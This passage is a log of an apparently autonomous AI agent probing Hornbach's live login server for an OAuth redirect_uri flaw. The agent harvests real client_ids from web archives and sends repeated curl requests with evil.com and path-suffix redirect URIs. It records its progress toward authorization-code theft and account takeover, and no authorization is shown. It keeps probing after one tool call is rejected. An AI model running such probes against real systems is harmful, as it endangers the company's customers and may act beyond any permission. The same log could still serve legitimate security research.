@@ -32282,3 +32282,149 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 - [RISK] hornbach: 62/100 — redirect_uri prefix-match (RFC violation) is CONFIRMED and now chains toward code theft WITHOUT a same-host sink if the @/subdomain authority-mutation probes accept (CRITICAL ATO, fully anonymous-testable at the authz gate); unauthenticated introspect/revoke remains the only non-gated finding; chain is one confirming differential away from a reportable, code-delivery-to-attacker credential.
+===== ANALYST bigpickle 2026-09-19 14:50:46 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m✱ [0mGlob "**/*.md"[90m 100 matches[0m
+[0m
+[0m$ [0mfor u in \
+"https://auth.hornbach.com/.well-known/openid-configuration" \
+"https://auth.hornbach.com/.well-known/status" \
+"https://auth.hornbach.com/" \
+"https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=00000000-0000-0000-0000-000000000000&redirect_uri=https://evil.com&scope=openid" \
+"https://auth.hornbach.com/session/check_session" \
+"https://api.hornbach.de/" \
+"https://api.hornbach.de/healthcheck" \
+"https://auth.hornbach.de/" \
+"https://hornbach-mp.mirakl.net/"; do \
+curl -sk -o /dev/null -m 20 -w "$(date -u +%H:%M:%S) %{http_code} %{size_download}B %{redirect_url} %{url_effective}\n" "$u"; sleep 1; done
+14:47:22 200 3189B  https://auth.hornbach.com/.well-known/openid-configuration
+14:47:23 200 60B  https://auth.hornbach.com/.well-known/status
+14:47:25 302 0B https://hornbach.de/ https://auth.hornbach.com/
+14:47:26 302 0B https://auth.hornbach.com/identity/error?error=invalid_client&error_code=AUTH10007&error_description=invalid_client%3A+invalid+client_id+passed&error_hint=please+check+if+you+passing+correct+client_id+or+the+client+is+disabled+or+deleted&iss=https%253A%252F%252Fauth.hornbach.com https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=00000000-0000-0000-0000-000000000000&redirect_uri=https://evil.com&scope=openid
+14:47:27 200 27021B  https://auth.hornbach.com/session/check_session
+14:47:29 404 47B  https://api.hornbach.de/
+14:47:30 200 19B  https://api.hornbach.de/healthcheck
+14:47:32 302 413B https://auth.hornbach.de/logon/LogonPoint/tmindex.html https://auth.hornbach.de/
+14:47:34 302 0B https://hornbach-mp.mirakl.net/login/oauth2/mirakl-sso?prompt=none https://hornbach-mp.mirakl.net/
+[0m
+[0m→ [0mRead triage/run-2026-09-19-12-13.md
+[0m→ [0mRead leads/lead-bigpickle.md
+[0m→ [0mRead recon-notes/DEDICATED-DEEP.md[90m [limit=80][0m
+[0m→ [0mRead triage/run-2026-09-19-07-45.md
+[0m
+[0m$ [0mtail -n 30 /home/runner/work/hornbach-hunt/hornbach-hunt/probe-results.md; echo ---; wc -l /home/runner/work/hornbach-hunt/hornbach-hunt/probe-results.md
+https://auth.hornbach.com/authz-srv/device/authz -> HTTP 400
+
+## 2026-09-18 23:25:13 UTC
+https://auth.hornbach.com/token-srv/introspect -> HTTP 404
+https://auth.hornbach.com/token-srv/revoke -> HTTP 404
+https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<valid_client_id>&redirect_uri=https://evil.com&scope=openid -> 200 len=?
+https://auth.hornbach.com/session/check_session -> 200 len=?
+
+## 2026-09-19 01:37:44 UTC
+https://auth.hornbach.com/token-srv/introspect -> HTTP 404
+https://auth.hornbach.com/token-srv/revoke -> HTTP 404
+https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<valid_client_id>&redirect_uri=https://evil.com&scope=openid -> 200 len=?
+https://auth.hornbach.com/session/check_session -> 200 len=?
+
+## 2026-09-19 06:38:20 UTC
+https://auth.hornbach.com/token-srv/introspect -> HTTP 404
+https://auth.hornbach.com/token-srv/revoke -> HTTP 404
+https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<valid_client_id>&redirect_uri=https://evil.com&scope=openid -> 200 len=?
+https://auth.hornbach.com/session/check_session -> 200 len=?
+
+## 2026-09-19 11:35:52 UTC
+https://auth.hornbach.com/token-srv/introspect -> HTTP 404
+https://auth.hornbach.com/token-srv/revoke -> HTTP 404
+https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<valid_client_id>&redirect_uri=https://evil.com&scope=openid -> 200 len=?
+https://auth.hornbach.com/session/check_session -> 200 len=?
+https://auth.hornbach.com/ -> 200 len=3038
+https://auth.hornbach.com/apps-srv/clients/register` -> HTTP 404
+https://auth.hornbach.com/apps-srv/clients/register -> HTTP 404
+https://auth.hornbach.com/authz-srv/authz?response_type=code&client_id=<found>&redirect_uri=https://evil.com&scope=openid -> 200 len=?
+https://auth.hornbach.com/authz-srv/device/authz -> HTTP 400
+---
+649 /home/runner/work/hornbach-hunt/hornbach-hunt/probe-results.md
+[0m
+[0m% [0mWebFetch http://web.archive.org/cdx/search/cdx?url=auth.hornbach.com*&output=text&fl=timestamp,original,statuscode&collapse=urlkey&limit=300
+[0m% [0mWebFetch http://web.archive.org/cdx/search/cdx?url=www.hornbach.de*&output=text&fl=timestamp,original,statuscode,mimetype&collapse=urlkey&filter=mimetype:application/javascript&limit=200
+Major breakthrough — Wayback CDX returned **full, real client_ids** from historical `authz-srv/authz` redirects (f243e104-8bd9-4bb5-a78a-92ee473a0161 = DE checkout, 5d5a8797-c255-421a-8cdc-b675b84270b1 = CZ customer, a319e635-38c8-4cde-be1d-e2341e3c6480 = NL customer, 28e0cbe4-47d1-4bc2-812f-ad3ca8528915 = CH checkout, 063c8171-50be-4b0f-aac8-d1237882ff64 = RO, 30e033d9-afe7-4646-982a-e41872b33b0e = NL checkout) plus the archived OIDC-service SPA bundle paths. This unblocks the redirect_uri hypothesis. Let me confirm the client_ids are still live and test authority-mutation variants.
+[0m
+[0m$ [0mecho "== AppConfiguration (20260529) =="; curl -sL --max-time 40 "http://web.archive.org/web/20260529123619id_/https://www.hornbach.de/auth/pages/assets/AppConfiguration.0VYymETS.js" -o /tmp/appcfg.js; ls -la /tmp/appcfg.js; grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' /tmp/appcfg.js | sort -u; grep -oE 'client_?id[^,;]{0,60}' /tmp/appcfg.js | head; echo "== oidcService static (20260826) =="; curl -sL --max-time 40 "http://web.archive.org/web/20260826142116id_/https://www.hornbach.de/auth/oidc-service/static/oidcService.BIpWcoLm.js" -o /tmp/oidc.js; ls -la /tmp/oidc.js; grep -oE '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' /tmp/oidc.js | sort -u; grep -oE 'silentLoginCallback[^"'\''`]{0,80}' /tmp/oidc.js | head
+== AppConfiguration (20260529) ==
+-rw-r--r-- 1 runner runner 333 Sep 19 14:49 /tmp/appcfg.js
+== oidcService static (20260826) ==
+-rw-r--r-- 1 runner runner 36570 Sep 19 14:49 /tmp/oidc.js
+[0m
+[0m$ [0mprobes=(
+"base_de|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/checkout/flow/step/2?orderType=DV&isLoggedIn=true&locale=de_DE&raMarketCode=DE612&abort=true"
+"userinfo_de|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de@evil.com/checkout/flow/step/2"
+"subsuffix_de|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de.evil.com/checkout/flow/step/2"
+"pathsuffix_de|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/checkout/flow/step/2.evil.com"
+"base_cz|5d5a8797-c255-421a-8cdc-b675b84270b1|https://www.hornbach.cz/customer/"
+"userinfo_cz|5d5a8797-c255-421a-8cdc-b675b84270b1|https://www.hornbach.cz@evil.com/customer/"
+"silent_cz|5d5a8797-c255-421a-8cdc-b675b84270b1|https://www.hornbach.cz/auth/oidc-service/silentLoginCallback/"
+"base_nl|a319e635-38c8-4cde-be1d-e2341e3c6480|https://www.hornbach.nl/customer/account/purchases/#/?"
+)
+for p in "${probes[@]}"; do
+  IFS='|' read -r name cid ru <<<"$p"
+  hdr=$(curl -sk -o /dev/null -D - -G --max-time 20 "https://auth.hornbach.com/authz-srv/authz" \
+    --data-urlencode "response_type=code" --data-urlencode "client_id=$cid" \
+    --data-urlencode "scope=openid" --data-urlencode "state=test" --data-urlencode "redirect_uri=$ru")
+  code=$(printf '%s' "$hdr" | head -1 | tr -d '\r')
+  loc=$(printf '%s' "$hdr" | grep -i '^location:' | tr -d '\r' | cut -c1-150)
+  ck=$(printf '%s' "$hdr" | grep -i '^set-cookie:' | grep -o 'cidaas_dr' | head -1)
+  echo "$(date -u +%H:%M:%S) $name | $code | cookie=$ck | loc=${loc:0:130}"
+  sleep 1
+done
+14:49:09 base_de | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.de/auth/pages/web/?requestId=b82c88c7-34ab-4ae7-88cb-002ee3760582&view_type=login
+14:49:10 userinfo_de | HTTP/2 302  | cookie= | loc=location: https://auth.hornbach.com/identity/error?error=invalid_request&error_code=AUTH10009&error_description=invalid_request%3A
+14:49:11 subsuffix_de | HTTP/2 302  | cookie= | loc=location: https://auth.hornbach.com/identity/error?error=invalid_request&error_code=AUTH10009&error_description=invalid_request%3A
+14:49:13 pathsuffix_de | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.de/auth/pages/web/?requestId=9ea12b55-d98c-48de-9769-f9256889ba71&view_type=login
+14:49:14 base_cz | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.cz/auth/pages/web/?requestId=b29ddde2-b52a-4664-afb4-26d419691d39&view_type=login
+14:49:15 userinfo_cz | HTTP/2 302  | cookie= | loc=location: https://auth.hornbach.com/identity/error?error=invalid_request&error_code=AUTH10009&error_description=invalid_request%3A
+14:49:17 silent_cz | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.cz/auth/pages/web/?requestId=79ee93ff-6e1d-4b55-bb07-3ade58e5103c&view_type=login
+14:49:18 base_nl | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.nl/auth/pages/web/?requestId=f372ebf0-e5f6-4599-aeba-67c6883c754e&view_type=login
+[0m
+[93m[1m! [0mpermission requested: external_directory (/tmp/*); auto-rejecting
+[0m✗ [0mcat /tmp/appcfg.js; echo; echo "== oidc.js greps =="; 
+grep -oE 'window\.parent\.postMessage[^;]{0,120}' /tmp/oidc.js | head; 
+echo "--origins--"; grep -oE 'https?://[a-zA-Z0-9._-]+(\.hornbach\.[a-z]{2,3})?[a-zA-Z0-9./_-]*' /tmp/oidc.js | sort -u | head -30;
+echo "--client---"; grep -oE 'client_?id["'\"'']?\s*[:=]\s*["'\"']?[0-9a-f-]{36}' /tmp/oidc.js | head;
+echo "--postMessage/MessageEvent--"; grep -oiE '(addEventListener|MessageEvent|onmessage|source\.origin|e\.origin|event\.origin)[^;]{0,80}' /tmp/oidc.js | head -20;
+echo "--silent callback fcn--"; grep -oiE 'silentLogin[^;]{0,120}' /tmp/oidc.js | head failed
+[91m[1mError: [0mThe user rejected permission to use this specific tool call.
+Confirmed live. Client_ids recovered from Wayback are **still valid today** — exact registered URIs → 302 to the cidaas login SPA at `www.hornbach.{de,cz,nl}/auth/pages/web/?view_type=login` with `cidaas_dr` cookie. Critically:
+- `userinfo`/`subsuffix` authority mutations → **AUTH10009 (rejected)** — host parsed correctly
+- `pathsuffix_de` → **ACCEPTED** (302→login) — consistent with raw-string **prefix** matching of the registered URI
+
+Now characterizing the matcher (query binding) and auditing the archived OIDC silent-login iframe for code-delivery logic.
+[0m
+[0m$ [0mprobes=(
+"q_drop|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/checkout/flow/step/2"
+"q_swap|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/checkout/flow/step/2?orderType=EVIL&isLoggedIn=true&locale=de_DE&raMarketCode=DE612&abort=true"
+"q_extra|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/checkout/flow/step/2?orderType=DV&isLoggedIn=true&locale=de_DE&raMarketCode=DE612&abort=true&x=1"
+"path_extra|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/checkout/flow/step/2/anything/x"
+"unrelated|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/unrelated"
+"host_root|f243e104-8bd9-4bb5-a78a-92ee473a0161|https://www.hornbach.de/"
+)
+for p in "${probes[@]}"; do
+  IFS='|' read -r name cid ru <<<"$p"
+  hdr=$(curl -sk -o /dev/null -D - -G --max-time 20 "https://auth.hornbach.com/authz-srv/authz" \
+    --data-urlencode "response_type=code" --data-urlencode "client_id=$cid" \
+    --data-urlencode "scope=openid" --data-urlencode "state=test" --data-urlencode "redirect_uri=$ru")
+  code=$(printf '%s' "$hdr" | head -1 | tr -d '\r')
+  loc=$(printf '%s' "$hdr" | grep -i '^location:' | tr -d '\r' | cut -c1-200)
+  ck=$(printf '%s' "$hdr" | grep -i '^set-cookie:' | grep -o 'cidaas_dr' | head -1)
+  echo "$(date -u +%H:%M:%S) $name | $code | cookie=$ck | loc=${loc:0:190}"
+  sleep 1
+done
+14:50:02 q_drop | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.de/auth/pages/web/?requestId=2bda8c66-4960-480c-bb88-44cc3fa6d9ac&view_type=login
+14:50:03 q_swap | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.de/auth/pages/web/?requestId=446b2d09-17b8-4971-bef2-922e34876e6f&view_type=login
+14:50:05 q_extra | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.de/auth/pages/web/?requestId=b391bf65-5e19-4996-8573-74b0e96b078a&view_type=login
+14:50:06 path_extra | HTTP/2 302  | cookie=cidaas_dr | loc=location: https://www.hornbach.de/auth/pages/web/?requestId=5c3fa41f-0ba5-4766-8b2d-313904fcc603&view_type=login
+14:50:08 unrelated | HTTP/2 302  | cookie= | loc=location: https://auth.hornbach.com/identity/error?error=invalid_request&error_code=AUTH10009&error_description=invalid_request%3A+given+url+is+not+allowed+by+the+application+configuration&e
+14:50:09 host_root | HTTP/2 302  | cookie= | loc=location: https://auth.hornbach.com/identity/error?error=invalid_request&error_code=AUTH10009&error_description=invalid_request%3A+given+url+is+not+allowed+by+the+application+configuration&e
+[0m
